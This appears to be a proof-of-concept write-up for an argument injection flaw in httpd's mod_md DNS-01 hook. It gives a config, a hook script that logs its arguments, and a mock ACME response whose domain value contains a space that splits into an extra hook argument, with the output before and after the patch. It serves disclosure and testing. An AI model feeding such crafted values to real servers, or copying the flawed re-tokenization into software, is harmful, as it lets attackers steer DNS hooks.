# PoC 066 - DNS-01 Setup Hook Argument Injection

`cha_dns_01_setup()` builds the hook command line with `apr_psprintf` and
then re-tokenizes it with `apr_tokenize_to_argv`. Whitespace in the
ACME-supplied `authz->domain` therefore splits into extra argv elements and
shifts the DNS hook's positional arguments.

## Setup

Vulnerable httpd 2.4.66 with `mod_md`, plus a mock ACME server that returns
authorization JSON whose `identifier.value` contains whitespace.

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule watchdog_module modules/mod_watchdog.so
LoadModule md_module       modules/mod_md.so

MDCertificateAuthority http://127.0.0.1:14000/dir
MDChallengeDns01 /tmp/poc066/dnshook.sh
MDDriveMode auto
MDomain "victim.example extra-arg"     # request domain WITH whitespace
```

Hook script that records its argv exactly as received:

```bash
#!/bin/sh
# /tmp/poc066/dnshook.sh
echo "argc=$#"
i=0
for a in "$@"; do
    i=$((i+1))
    printf 'argv[%d]=<%s>\n' "$i" "$a"
done >> /tmp/poc066/argv.log
exit 0
```

```
chmod +x /tmp/poc066/dnshook.sh
: > /tmp/poc066/argv.log
```

Mock ACME server `acme.py` that serves the minimum endpoints httpd's MD
client needs (`/dir`, `/new-nonce`, `/new-account`, `/new-order`,
`/authz/1`) and crucially answers an authz query with:

```json
{ "identifier": { "type": "dns",
                  "value": "victim.example extra-arg" },
  "status": "pending",
  "challenges": [
    { "type": "dns-01", "url": "...", "token": "AAAABBBBCCCC" }
  ] }
```

Run the mock with `python3 -m http.server`-style stub; the relevant detail
is that `identifier.value` echoes the attacker-controlled string with an
embedded space.

## Trigger

```
python3 /tmp/poc066/acme.py &
httpd -X -f $PWD/conf/httpd.conf
```

When `mod_md`'s drive loop reaches DNS-01 setup, `cha_dns_01_setup` invokes
the hook.

## Observed effect

`/tmp/poc066/argv.log` shows the hook invoked with split arguments rather
than the intended three-positional form:

```
argc=4
argv[1]=<setup>
argv[2]=<victim.example>
argv[3]=<extra-arg>
argv[4]=<AAAABBBBCCCC>
```

The hook expected `setup <domain> <token>` but got an extra argument
inserted between domain and token. A real-world DNS provider hook that
parses options would now see `--zone`, `--ttl`, etc. flowing in from the
ACME response, potentially causing it to update the wrong zone or treat the
DNS token as a flag value. With the patch applied, the hook receives:

```
argc=3
argv[1]=<setup>
argv[2]=<victim.example extra-arg>
argv[3]=<AAAABBBBCCCC>
```

i.e. the domain is delivered as one argv slot regardless of its content.
